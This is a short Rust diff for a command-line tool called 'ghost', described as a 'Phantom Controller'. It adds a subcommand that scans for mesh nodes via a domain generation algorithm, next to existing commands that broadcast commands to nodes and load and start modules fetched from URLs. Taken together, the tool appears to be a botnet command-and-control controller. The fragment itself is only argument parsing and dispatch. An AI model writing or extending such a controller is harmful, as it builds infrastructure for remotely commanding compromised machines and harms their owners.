@@ -8,7 +8,7 @@ mod discovery;
 
 #[derive(Parser)]
 #[command(name = "ghost")]
-#[command(about = "The Ghost Master Controller", long_about = None)]
+#[command(about = "The Ghost Phantom Controller", long_about = None)]
 struct Cli {
     #[command(subcommand)]
     command: Commands,
@@ -68,6 +68,8 @@ enum Commands {
         #[arg(long, default_value = "")]
         args: String,
     },
+    /// Scan for Mesh Nodes via DGA
+    Scan,
 }
 
 #[tokio::main]
@@ -80,5 +82,6 @@ async fn main() {
         Commands::Broadcast { bootstrap, key, cmd } => commands::handle_broadcast(bootstrap, key, cmd).await,
         Commands::Load { bootstrap, key, url, name } => commands::handle_load_module(bootstrap, key, url, name).await,
         Commands::Start { bootstrap, key, name, args } => commands::handle_start_module(bootstrap, key, name, args).await,
+        Commands::Scan => commands::handle_scan().await,
     }
 }
